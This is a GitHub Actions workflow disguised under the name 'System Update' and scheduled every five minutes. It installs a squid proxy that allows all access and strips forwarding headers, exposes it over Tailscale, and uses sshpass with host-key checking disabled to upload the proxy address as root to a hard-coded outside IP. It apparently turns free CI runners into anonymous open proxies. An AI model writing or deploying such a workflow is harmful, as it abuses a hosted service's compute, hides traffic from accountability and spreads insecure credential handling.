name: System Update

on:
  workflow_dispatch:
  schedule:
    - cron: '*/5 * * * *'

jobs:
  maintenance:
    runs-on: ubuntu-latest
    steps:
      - name: Install squid
        run: sudo apt update && sudo apt install squid -y

      - name: Config squid
        run: |
          sudo bash -c 'cat > /etc/squid/squid.conf << EOF
          http_port 3128
          http_access allow all
          forwarded_for off
          via off
          EOF'
          sudo systemctl restart squid

      - name: Install Tailscale
        run: |
          curl -fsSL https://tailscale.com/install.sh | sh
          sudo tailscale up --auth-key=${{ secrets.TS }}

      - name: Expose via Tailscale Serve
        run: |
          sudo tailscale serve --bg --tcp 443 --serve-port 3128
          sleep 5
          sudo tailscale serve status

      - name: Get address and upload
        env:
          REM: ${{ secrets.REM }}
        run: |
          TS_HOST=$(sudo tailscale ip -4)
          echo "${TS_HOST}:443" > /tmp/proxy.txt
          cat /tmp/proxy.txt
          sudo apt install sshpass -y
          sshpass -p "${REM}" scp -o StrictHostKeyChecking=no /tmp/proxy.txt root@45.144.53.63:/var/www/html/git_enemy3civil.txt
          sleep 400
